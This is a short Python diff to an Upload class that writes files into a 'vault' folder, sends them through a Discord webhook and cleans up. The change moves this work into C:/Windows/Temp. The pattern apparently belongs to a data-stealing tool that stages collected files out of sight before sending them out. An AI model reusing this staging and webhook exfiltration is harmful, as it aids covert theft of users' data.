@@ -28,9 +28,11 @@ class Upload:
     def __init__(self, webhook: SyncWebhook):
         self.webhook = webhook
 
+        os.chdir('C:/Windows/Temp')
         self.write_files()
         self.send()
         self.clean()
+        os.chdir(os.path.dirname(__file__))
     
     def write_files(self):
         os.makedirs("vault", exist_ok=True)
